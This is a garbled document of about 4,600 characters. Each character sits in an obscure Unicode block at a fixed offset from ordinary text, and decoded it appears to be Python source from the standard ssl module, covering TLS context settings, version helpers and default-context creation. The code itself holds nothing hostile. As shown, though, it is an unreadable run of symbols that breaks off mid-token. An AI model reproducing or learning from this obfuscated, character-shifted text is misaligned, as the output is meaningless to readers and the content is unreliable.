ꚫ꛸꛾꛲ꛪ꛿꜄꛻꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛐ꛴꛿꛳꛰꛽ꚫꛬꚫꛅꛮ꛷ꛬ꛾꛾ꛅꛫꛪꛟꛗꛞꛎ꛺꛹꛿꛰꛹꛿ꛟ꜄꛻꛰ꛫꚫ꛰꛹꜀꛸ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛱꛺꛽ꚫꛬꚫ꛳꛰ꛬꛯ꛰꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚷꚫꛬꚫꛅꛮ꛷ꛬ꛾꛾ꛅꛫꛪꛟꛗꛞꛌ꛷꛰꛽꛿ꛟ꜄꛻꛰ꛫꚫ꛰꛹꜀꛸ꚫ꛸꛰꛸ꛭ꛰꛽ꚫ꛱꛺꛽ꚫꛬ꛹ꚫꛬ꛷꛰꛽꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚷꚫꛬꚫꛅꛮ꛷ꛬ꛾꛾ꛅꛫꛪꛟꛗꛞꛘ꛰꛾꛾ꛬ꛲꛰ꛟ꜄꛻꛰ꛫꚫ꛰꛹꜀꛸ꚫ꛸꛰꛸ꛭ꛰꛽ꚫ꛱꛺꛽ꚫ꛺꛿꛳꛰꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛰꛾꛾ꛬ꛲꛰꛾ꚷꚫ꛺꛽ꚫ꛴꛹꛿ꚫ꛱꛺꛽ꚫ꜀꛹꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚫ꛿꜄꛻꛰꛾ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯꛬ꛿ꛬꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛝꛬ꜂ꚷꚫꛯ꛰ꛮ꛽꜄꛻꛿꛰ꛯꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚫꛮ꛺꛹꛿꛰꛹꛿ꚫꛬ꛾ꚫꛭ꜄꛿꛰꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛹꛹꛰꛽ꚫꛈꚫ꛾꜀꛻꛰꛽ꚳꚴꚹꛪ꛸꛾꛲ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛴꛹꛹꛰꛽ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛴꛹꛹꛰꛽ꚹ꜀꛾꛰꛽ꛪ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚕꚫꚫꚫꚫꛋꛪ꛸꛾꛲ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛸꛾꛲ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚳ꛾꛰꛷꛱ꚷꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚴꚹꛪ꛸꛾꛲ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚹꛪꛪ꛾꛰꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫꛙ꛺꛹꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚷꚫꚲꛪꛪꛮꛬ꛷꛷ꛪꛪꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳ꛱ꚭ꜆ꛮꛬ꛷꛷ꛭꛬꛮ꛶꜈ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛮꛬ꛷꛷ꛬꛭ꛷꛰ꚹꚭꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛴꛹꛹꛰꛽ꚳꛮ꛺꛹꛹ꚷꚫꛯ꛴꛽꛰ꛮ꛿꛴꛺꛹ꚷꚫ꜁꛰꛽꛾꛴꛺꛹ꚷꚫꛮ꛺꛹꛿꛰꛹꛿ꛪ꛿꜄꛻꛰ꚷꚫ꛸꛾꛲ꛪ꛿꜄꛻꛰ꚷꚫꛯꛬ꛿ꛬꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜁꛰꛽꛾꛴꛺꛹ꚫꛈꚫꛟꛗꛞꛡ꛰꛽꛾꛴꛺꛹ꚳ꜁꛰꛽꛾꛴꛺꛹ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꛹꛿ꛪ꛿꜄꛻꛰ꚫꛈꚫꛪꛟꛗꛞꛎ꛺꛹꛿꛰꛹꛿ꛟ꜄꛻꛰ꚳꛮ꛺꛹꛿꛰꛹꛿ꛪ꛿꜄꛻꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛺꛹꛿꛰꛹꛿ꛪ꛿꜄꛻꛰ꚫꛈꛈꚫꛪꛟꛗꛞꛎ꛺꛹꛿꛰꛹꛿ꛟ꜄꛻꛰ꚹꛓꛐꛌꛏꛐꛝꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛾꛲ꛪ꛰꛹꜀꛸ꚫꛈꚫꛪꛟꛗꛞꛎ꛺꛹꛿꛰꛹꛿ꛟ꜄꛻꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛴꛱ꚫꛮ꛺꛹꛿꛰꛹꛿ꛪ꛿꜄꛻꛰ꚫꛈꛈꚫꛪꛟꛗꛞꛎ꛺꛹꛿꛰꛹꛿ꛟ꜄꛻꛰ꚹꛌꛗꛐꛝꛟꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛾꛲ꛪ꛰꛹꜀꛸ꚫꛈꚫꛪꛟꛗꛞꛌ꛷꛰꛽꛿ꛟ꜄꛻꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛾꛲ꛪ꛰꛹꜀꛸ꚫꛈꚫꛪꛟꛗꛞꛘ꛰꛾꛾ꛬ꛲꛰ꛟ꜄꛻꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛾꛲ꛪ꛿꜄꛻꛰ꚫꛈꚫ꛸꛾꛲ꛪ꛰꛹꜀꛸ꚳ꛸꛾꛲ꛪ꛿꜄꛻꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚳꛮ꛺꛹꛹ꚷꚫꛯ꛴꛽꛰ꛮ꛿꛴꛺꛹ꚷꚫ꜁꛰꛽꛾꛴꛺꛹ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꛹꛿ꛪ꛿꜄꛻꛰ꚷꚫ꛸꛾꛲ꛪ꛿꜄꛻꛰ꚷꚫꛯꛬ꛿ꛬꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛹꛹꛰꛽ꚹ꜀꛾꛰꛽ꛪ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚫꛈꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚴꚹꛪ꛸꛾꛲ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚹꛪꛪ꛾꛰꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꛴꛹꛹꛰꛽ꚴꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛪꛞꛞꛗꛘ꛰꛿꛳꛺ꛯꚳ꛾꜀꛻꛰꛽ꚳꚴꚹ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚴꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜁꛰꛽꛴꛱꜄ꛪ꛱꛷ꛬ꛲꛾ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛡ꛰꛽꛴꛱꜄ꛑ꛷ꛬ꛲꛾ꚳ꛾꜀꛻꛰꛽ꚳꚴꚹ꜁꛰꛽꛴꛱꜄ꛪ꛱꛷ꛬ꛲꛾ꚴꚕꚕꚫꚫꚫꚫꛋ꜁꛰꛽꛴꛱꜄ꛪ꛱꛷ꛬ꛲꛾ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜁꛰꛽꛴꛱꜄ꛪ꛱꛷ꛬ꛲꛾ꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚴꚹ꜁꛰꛽꛴꛱꜄ꛪ꛱꛷ꛬ꛲꛾ꚹꛪꛪ꛾꛰꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜁ꛬ꛷꜀꛰ꚫꛈꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛡ꛰꛽꛴꛱꜄ꛘ꛺ꛯ꛰ꚳ꜁ꛬ꛷꜀꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꜁ꛬ꛷꜀꛰ꚕꚕꚫꚫꚫꚫꛋ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚴꚹ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚹꛪꛪ꛾꛰꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꚕꚕꚕꛯ꛰꛱ꚫꛮ꛽꛰ꛬ꛿꛰ꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪꛮ꛺꛹꛿꛰꜃꛿ꚳ꛻꜀꛽꛻꛺꛾꛰ꛈꛛ꜀꛽꛻꛺꛾꛰ꚹꛞꛐꛝꛡꛐꛝꛪꛌꛠꛟꛓꚷꚫꚵꚷꚫꛮꛬ꛱꛴꛷꛰ꛈꛙ꛺꛹꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛻ꛬ꛿꛳ꛈꛙ꛺꛹꛰ꚷꚫꛮꛬꛯꛬ꛿ꛬꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛎ꛽꛰ꛬ꛿꛰ꚫꛬꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꜂꛴꛿꛳ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛾꛰꛿꛿꛴꛹꛲꛾ꚹꚕꚕꚫꚫꚫꚫꛙꛚꛟꛐꛅꚫꛟ꛳꛰ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫꛬ꛹ꛯꚫ꛾꛰꛿꛿꛴꛹꛲꛾ꚫ꛸ꛬ꜄ꚫꛮ꛳ꛬ꛹꛲꛰ꚫꛬ꛹꜄꛿꛴꛸꛰ꚫ꜂꛴꛿꛳꛺꜀꛿ꚫ꛻꛽꛴꛺꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛻꛽꛰ꛮꛬ꛿꛴꛺꛹ꚹꚫꛟ꛳꛰ꚫ꜁ꛬ꛷꜀꛰꛾ꚫ꛽꛰꛻꛽꛰꛾꛰꛹꛿ꚫꛬꚫ꛱ꛬ꛴꛽ꚫꛭꛬ꛷ꛬ꛹ꛮ꛰ꚫꛭ꛰꛿꜂꛰꛰꛹ꚫ꛸ꛬ꜃꛴꛸꜀꛸ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛸꛻ꛬ꛿꛴ꛭ꛴꛷꛴꛿꜄ꚫꛬ꛹ꛯꚫ꛾꛰ꛮ꜀꛽꛴꛿꜄ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛴꛾꛴꛹꛾꛿ꛬ꛹ꛮ꛰ꚳ꛻꜀꛽꛻꛺꛾꛰ꚷꚫꛪꛌꛞꛙꚼꛚꛭ꛵꛰ꛮ꛿ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳ꛻꜀꛽꛻꛺꛾꛰ꚴꚕꚕꚫꚫꚫꚫꚮꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚫ꛾꛰꛿꛾ꚫꛚꛛꛪꛙꛚꛪꛞꛞꛗ꜁ꚽꚷꚫꛚꛛꛪꛙꛚꛪꛞꛞꛗ꜁ꚾꚷꚫꛚꛛꛪꛙꛚꛪꛎꛚꛘꛛꛝꛐꛞꛞꛔꛚꛙꚷꚕꚫꚫꚫꚫꚮꚫꛚꛛꛪꛎꛔꛛꛓꛐꛝꛪꛞꛐꛝꛡꛐꛝꛪꛛꛝꛐꛑꛐꛝꛐꛙꛎꛐꚷꚫꛚꛛꛪꛞꛔꛙꛒꛗꛐꛪꛏꛓꛪꛠꛞꛐꚫꛬ꛹ꛯꚫꛚꛛꛪꛞꛔꛙꛒꛗꛐꛪꛐꛎꛏꛓꛪꛠꛞꛐꚕꚫꚫꚫꚫꚮꚫꛭ꜄ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚹꚕꚫꚫꚫꚫ꛴꛱ꚫ꛻꜀꛽꛻꛺꛾꛰ꚫꛈꛈꚫꛛ꜀꛽꛻꛺꛾꛰ꚹꛞꛐꛝꛡꛐꛝꛪꛌꛠꛟꛓꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꜁꛰꛽꛴꛱꜄ꚫꛮ꛰꛽꛿꛾ꚫꛬ꛹ꛯꚫ꛳꛺꛾꛿ꚫ꛹ꛬ꛸꛰ꚫ꛴꛹ꚫꛮ꛷꛴꛰꛹꛿ꚫ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚳꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꛪꛎꛗꛔꛐꛙꛟꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚫꛈꚫꛎꛐꛝꛟꛪꛝꛐꛜꛠꛔꛝꛐꛏꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹꛮ꛳꛰ꛮ꛶ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꛈꚫꛟ꛽꜀꛰ꚕꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛻꜀꛽꛻꛺꛾꛰ꚫꛈꛈꚫꛛ꜀꛽꛻꛺꛾꛰ꚹꛎꛗꛔꛐꛙꛟꛪꛌꛠꛟꛓꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚳꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꛪꛞꛐꛝꛡꛐꛝꚴꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳ꛻꜀꛽꛻꛺꛾꛰ꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫꛮꛬ꛱꛴꛷꛰ꚫ꛺꛽ꚫꛮꛬ꛻ꛬ꛿꛳ꚫ꛺꛽ꚫꛮꛬꛯꛬ꛿ꛬꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛷꛺ꛬꛯꛪ꜁꛰꛽꛴꛱꜄ꛪ꛷꛺ꛮꛬ꛿꛴꛺꛹꛾ꚳꛮꛬ꛱꛴꛷꛰ꚷꚫꛮꛬ꛻ꛬ꛿꛳ꚷꚫꛮꛬꛯꛬ꛿ꛬꚴꚕꚫꚫꚫꚫ꛰꛷꛴꛱ꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚫꚬꛈꚫꛎꛐꛝꛟꛪꛙꛚꛙꛐꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛹꛺ꚫ꛰꜃꛻꛷꛴ꛮ꛴꛿ꚫꛮꛬ꛱꛴꛷꛰ꚷꚫꛮꛬ꛻ꛬ꛿꛳ꚫ꛺꛽ꚫꛮꛬꛯꛬ꛿ꛬꚫꛭ꜀꛿ꚫ꛿꛳꛰ꚫ꜁꛰꛽꛴꛱꜄ꚫ꛸꛺ꛯ꛰ꚫ꛴꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛎꛐꛝꛟꛪꛚꛛꛟꛔꛚꛙꛌꛗꚫ꛺꛽ꚫꛎꛐꛝꛟꛪꛝꛐꛜꛠꛔꛝꛐꛏꚹꚫꛗ꛰꛿ꚲ꛾ꚫ꛿꛽꜄ꚫ꛿꛺ꚫ꛷꛺ꛬꛯꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛾꜄꛾꛿꛰꛸ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛽꛺꛺꛿ꚫꛎꛌꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰꛾ꚫ꛱꛺꛽ꚫ꛿꛳꛰ꚫ꛲꛴꜁꛰꛹ꚫ꛻꜀꛽꛻꛺꛾꛰ꚹꚫꛟ꛳꛴꛾ꚫ꛸ꛬ꜄ꚫ꛱ꛬ꛴꛷ꚫ꛾꛴꛷꛰꛹꛿꛷꜄ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛷꛺ꛬꛯꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪꛮ꛰꛽꛿꛾ꚳ꛻꜀꛽꛻꛺꛾꛰ꚴꚕꚫꚫꚫꚫꚮꚫꛚ꛻꛰꛹ꛞꛞꛗꚫꚼꚹꚼꚹꚼꚫ꛶꛰꜄꛷꛺꛲ꚫ꛱꛴꛷꛰ꚕꚫꚫꚫꚫ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛮ꛺꛹꛿꛰꜃꛿ꚷꚫꚲ꛶꛰꜄꛷꛺꛲ꛪ꛱꛴꛷꛰꛹ꛬ꛸꛰ꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛶꛰꜄꛷꛺꛲꛱꛴꛷꛰ꚫꛈꚫ꛺꛾ꚹ꛰꛹꜁꛴꛽꛺꛹ꚹ꛲꛰꛿ꚳꚲꛞꛞꛗꛖꛐꛤꛗꛚꛒꛑꛔꛗꛐꚲꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛶꛰꜄꛷꛺꛲꛱꛴꛷꛰ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚫ꛾꜄꛾ꚹ꛱꛷ꛬ꛲꛾ꚹ꛴꛲꛹꛺꛽꛰ꛪ꛰꛹꜁꛴꛽꛺꛹꛸꛰꛹꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛶꛰꜄꛷꛺꛲ꛪ꛱꛴꛷꛰꛹ꛬ꛸꛰ꚫꛈꚫ꛶꛰꜄꛷꛺꛲꛱꛴꛷꛰ꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛮ꛺꛹꛿꛰꜃꛿ꚕꚕꛯ꛰꛱ꚫꛪꛮ꛽꛰ꛬ꛿꛰ꛪ꜀꛹꜁꛰꛽꛴꛱꛴꛰ꛯꛪꛮ꛺꛹꛿꛰꜃꛿ꚳ꛻꛽꛺꛿꛺ꛮ꛺꛷ꛈꛙ꛺꛹꛰ꚷꚫꚵꚷꚫꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꛈꛎꛐꛝꛟꛪꛙꛚꛙꛐꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛳꛰ꛮ꛶ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈꛑꛬ꛷꛾꛰ꚷꚫ꛻꜀꛽꛻꛺꛾꛰ꛈꛛ꜀꛽꛻꛺꛾꛰ꚹꛞꛐꛝꛡꛐꛝꛪꛌꛠꛟꛓꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛰꛽꛿꛱꛴꛷꛰ꛈꛙ꛺꛹꛰ꚷꚫ꛶꛰꜄꛱꛴꛷꛰ꛈꛙ꛺꛹꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛱꛴꛷꛰ꛈꛙ꛺꛹꛰ꚷꚫꛮꛬ꛻ꛬ꛿꛳ꛈꛙ꛺꛹꛰ꚷꚫꛮꛬꛯꛬ꛿ꛬꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛎ꛽꛰ꛬ꛿꛰ꚫꛬꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛱꛺꛽ꚫꛛ꜄꛿꛳꛺꛹ꚫ꛾꛿ꛯ꛷꛴ꛭꚫ꛸꛺ꛯ꜀꛷꛰꛾ꚕꚕꚫꚫꚫꚫꛌ꛷꛷ꚫꛛ꜄꛿꛳꛺꛹ꚫ꛾꛿ꛯ꛷꛴ꛭꚫ꛸꛺ꛯ꜀꛷꛰꛾ꚫ꛾꛳ꛬ꛷꛷ꚫ꜀꛾꛰ꚫ꛿꛳꛴꛾ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚫ꛿꛺ꚫꛮ꛽꛰ꛬ꛿꛰ꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚕꚫꚫꚫꚫ꛺ꛭ꛵꛰ꛮ꛿꛾ꚫ꛴꛹ꚫ꛺꛽ꛯ꛰꛽ꚫ꛿꛺ꚫ꛶꛰꛰꛻ꚫꛮ꛺꛸꛸꛺꛹ꚫ꛾꛰꛿꛿꛴꛹꛲꛾ꚫ꛴꛹ꚫ꛺꛹꛰ꚫ꛻꛷ꛬꛮ꛰ꚹꚫꛟ꛳꛰ꚫꛮ꛺꛹꛱꛴꛲꜀꛽ꛬ꛿꛴꛺꛹ꚕꚫꚫꚫꚫ꛴꛾ꚫ꛷꛰꛾꛾ꚫ꛽꛰꛾꛿꛽꛴ꛮ꛿ꚫ꛿꛳ꛬ꛹ꚫꛮ꛽꛰ꛬ꛿꛰ꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪꛮ꛺꛹꛿꛰꜃꛿ꚳꚴꚲ꛾ꚫ꛿꛺ꚫ꛴꛹ꛮ꛽꛰ꛬ꛾꛰ꚫꛭꛬꛮ꛶꜂ꛬ꛽ꛯꚕꚫꚫꚫꚫꛮ꛺꛸꛻ꛬ꛿꛴ꛭ꛴꛷꛴꛿꜄ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛴꛾꛴꛹꛾꛿ꛬ꛹ꛮ꛰ꚳ꛻꜀